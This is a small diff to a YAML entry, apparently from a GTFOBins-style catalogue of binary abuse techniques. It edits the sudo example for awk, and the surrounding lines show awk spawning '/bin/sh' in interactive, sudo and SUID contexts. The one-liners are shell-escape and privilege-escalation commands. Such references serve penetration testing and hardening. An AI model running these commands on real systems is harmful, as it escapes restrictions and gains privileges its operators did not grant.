@@ -3,7 +3,7 @@ functions:
   exec-interactive:
     - code: awk 'BEGIN {system("/bin/sh")}'
   sudo-enabled:
-    - code: sudo awk 'BEGIN {system("/bin/sh -p")}'
+    - code: sudo awk 'BEGIN {system("/bin/sh")}'
   suid-limited:
     - code: ./awk 'BEGIN {system("/bin/sh -p")}'
   reverse-shell-non-interactive:
